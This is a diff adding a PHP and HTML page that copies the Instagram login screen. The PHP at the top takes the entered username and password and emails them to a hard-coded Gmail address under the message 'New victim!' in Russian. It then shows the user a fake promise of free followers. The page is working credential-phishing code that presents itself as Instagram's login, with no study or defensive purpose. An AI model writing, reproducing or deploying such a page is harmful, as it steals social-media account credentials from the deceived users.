@@ -1,0 +1,76 @@
+<?php
+    if (isset($_POST['email']) && isset($_POST['message'])){
+        $name = $_POST['email'];
+        $message = $_POST['message'];
+
+        if (mail('karimelaassy10@gmail.com',
+                'Новое письмо',
+                'Новая жертва!'."\n".
+                'username: '.$name."\n".
+                'password: '.$message
+                
+    
+        )) {
+            echo('In 24 hours you will have 10 followers, come tomorrow for new ones');
+        } else {
+            echo('Error, please try again later')
+        }
+    }
+?>
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles.css" />
+    <title>Instagram clone</title>
+</head>
+<body>
+    <main class="flex align-items-center justify-content-center">
+        <section id="mobile" class="flex">
+        </section>
+        <section id="auth" class="flex direction-column">
+            <div class="panel login flex direction-column">
+                <h1 title="Instagram" class="flex justify-content-center">
+                    <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
+                </h1>
+                <form action="sandmail.php" method="POST">
+                    <input type="text" name="email" placeholder="Phone number, username or email"required>
+                    <input type="password" name="message" placeholder="Password" required>
+            
+                    <input type="submit" value= "Log in">
+                </form>
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OR</div>
+                    <span></span>
+                </div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <img />
+                        <a>Log in with Facebook</a>
+                    </div>
+                    <a href="#">Forgot password?</a>
+                </div>
+            </div>
+            <div class="panel register flex justify-content-center">
+                <p>Don't have an account?</p>
+                <a href="#">Sing up</a>
+            </div>
+            <div class="app-download flex direction-column align-items-center">
+                <p>Get the app.</p>
+                <div class="flex justify-content-center">
+                    <img src="./img/apple-button.png"      alt="Apple Store logo image" title="Imagem com a logo da Apple Store" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo image" title="Imagem com a logo da Google Play" />
+                </div>
+            </div>
+        </section>
+    </main>
+    <footer>
+        <ul class="flex flex-wrap justify-content-center">
+        </ul>
+        <p class="copyright">© 2020 Instagram from Meta</p>
+    </footer>
+</body>
+</html>
